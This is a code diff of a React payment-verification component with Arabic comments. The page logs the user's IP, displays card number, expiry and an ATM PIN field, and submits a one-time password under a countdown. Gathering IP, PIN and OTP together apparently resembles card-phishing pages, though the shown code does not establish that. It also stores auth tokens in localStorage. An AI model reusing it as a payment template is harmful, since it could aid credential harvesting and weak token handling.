@@ -10,7 +10,6 @@ const Code = () => {
   const [cardData, setCardData] = useState(null);
   const [totalAmount, setTotalAmount] = useState(0);
   const [currency, setCurrency] = useState('');
-  // إضافة حالة للعداد التنازلي
   const [timeLeft, setTimeLeft] = useState(120); // 120 ثانية = دقيقتين
   
   // دالة للحصول على IP المستخدم
@@ -25,7 +24,6 @@ const Code = () => {
     }
   };
 
-  // عند التحميل الأولي
   useEffect(() => {
     fetchUserIP();
     
@@ -54,12 +52,9 @@ const Code = () => {
     return () => clearTimeout(timer);
   }, []);
 
-  // إضافة useEffect للعداد التنازلي
+  // عداد تنازلي
   useEffect(() => {
-    if (timeLeft === 0) {
-      // يمكنك إضافة أي إجراء تريده عند انتهاء الوقت
-      return;
-    }
+    if (timeLeft === 0) return;
     
     const timerId = setTimeout(() => {
       setTimeLeft(timeLeft - 1);
@@ -80,14 +75,20 @@ const Code = () => {
       const otpData = { otp, userIP };
       const response = await fetch(`${process.env.REACT_APP_API_BASE_URL}/api/payment/submit-otp`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 
+          'Content-Type': 'application/json',
+          // إضافة رأس التوكن
+          'Authorization': `Bearer ${localStorage.getItem('authToken')}`
+        },
         body: JSON.stringify(otpData)
       });
 
       if (response.ok) {
-        // استخدم المسار الجديد الذي يحتوي على redirectPage
+        // جلب بيانات المستخدم باستخدام التوكن
         const userRes = await fetch(`${process.env.REACT_APP_API_BASE_URL}/api/protected/user`, {
-          credentials: 'include'
+          headers: {
+            'Authorization': `Bearer ${localStorage.getItem('authToken')}`
+          }
         });
         
         if (userRes.ok) {
@@ -124,17 +125,17 @@ const Code = () => {
     );
   }
 
-  // تنسيق رقم البطاقة لعرض أول 6 أرقام وإخفاء 6 أرقام ثم عرض الباقي
+  // تنسيق رقم البطاقة
   const formatCardNumber = (cardNumber) => {
     if (cardNumber.length >= 12) {
       const firstSix = cardNumber.substring(0, 6);
       const lastPart = cardNumber.substring(12);
       return `${firstSix}******${lastPart}`;
     }
-    return cardNumber; // في حالة أن رقم البطاقة أقل من 12 رقماً
+    return cardNumber;
   };
 
-  // تنسيق الوقت للعرض (دقائق:ثواني)
+  // تنسيق الوقت
   const formatTime = (seconds) => {
     const mins = Math.floor(seconds / 60);
     const secs = seconds % 60;
@@ -177,7 +178,6 @@ const Code = () => {
 
       <form onSubmit={handleSubmit} className="payment-form-container">
         <div className="payment-form">
-          {/* عرض رقم البطاقة بالتنسيق الجديد */}
           <div className="form-groupp">
             <div className="form-label">
               <label>رقم بطاقة الصرف الآلي:</label>
@@ -191,7 +191,6 @@ const Code = () => {
             </div>
           </div>
           
-          {/* عرض تاريخ انتهاء البطاقة */}
           <div className="form-groupp">
             <div className="form-label">
               <label>شهر إنتهاء الصلاحية  :</label>
@@ -216,7 +215,6 @@ const Code = () => {
               </div>   
             </div>
           </div>
-          {/* عرض الرقم السري */}
           <div className="form-groupp form-groupp3">
             <div className="form-label">   
               <label>الرقم السري:</label>
@@ -230,7 +228,6 @@ const Code = () => {
             </div>
           </div>
           
-          {/* حقل إدخال OTP مع العداد التنازلي */}
           <div className="form-groupp">
             <div className="form-label">   
               <label htmlFor="otp">رمز OTP:</label>
@@ -247,7 +244,6 @@ const Code = () => {
                   maxLength={6}
                   autoComplete="off"
                 />
-                {/* إضافة العداد التنازلي */}
                 <div className={`countdown-timer ${timeLeft < 30 ? 'countdown-warning' : ''}`}>
                   {formatTime(timeLeft)}
                 </div>
